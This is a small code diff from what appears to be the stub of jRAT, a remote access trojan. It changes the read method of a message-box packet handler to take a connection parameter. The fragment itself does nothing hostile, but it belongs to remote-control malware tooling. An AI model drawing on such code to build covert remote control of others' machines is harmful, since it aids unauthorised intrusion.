@@ -10,7 +10,7 @@ import se.jrat.stub.Constants;
 public class Packet10Messagebox extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		boolean theme = Connection.instance.readBoolean();
 
 		if (theme) {
